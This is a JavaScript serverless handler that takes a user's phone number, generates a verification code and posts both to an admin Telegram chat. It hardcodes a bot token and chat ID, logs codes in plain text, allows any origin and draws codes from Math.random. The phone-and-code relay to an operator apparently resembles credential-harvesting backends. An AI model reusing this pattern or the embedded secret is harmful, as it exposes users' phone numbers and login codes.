// api/sendCode.js
import fetch from 'node-fetch';

const ADMIN_BOT_TOKEN = '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec';
const ADMIN_CHAT_ID = '7303763255';

// Хранилище кодов (в памяти — для Vercel это временно)
// В продакшене используй Vercel KV или Redis
const codeStore = new Map();

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ success: false, error: 'Method not allowed' });
  }

  try {
    const { phone } = req.body;

    if (!phone || phone.length < 6) {
      return res.status(400).json({ success: false, error: 'Invalid phone number' });
    }

    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const requestId = `req_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

    codeStore.set(requestId, {
      phone,
      code,
      createdAt: Date.now(),
      attempts: 0
    });

    setTimeout(() => {
      if (codeStore.has(requestId)) {
        codeStore.delete(requestId);
        console.log(`[AUTO] Code for ${phone} expired (requestId: ${requestId})`);
      }
    }, 5 * 60 * 1000);

    // Отправляем код админу (в реальности — пользователю через TDLib)
    try {
      await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: ADMIN_CHAT_ID,
          text: `📱 Код верификации для ${phone}: *${code}*\nRequest ID: \`${requestId}\``,
          parse_mode: 'Markdown'
        })
      });
    } catch (e) {
      console.warn('Admin bot send error:', e.message);
    }

    console.log(`[SEND_CODE] phone: ${phone}, code: ${code}, requestId: ${requestId}`);

    return res.status(200).json({
      success: true,
      requestId: requestId,
      message: 'Code sent successfully'
    });

  } catch (error) {
    console.error('[SEND_CODE] Error:', error);
    return res.status(500).json({
      success: false,
      error: error.message || 'Internal server error'
    });
  }
}

// Экспортируем store для использования в других файлах
export { codeStore };
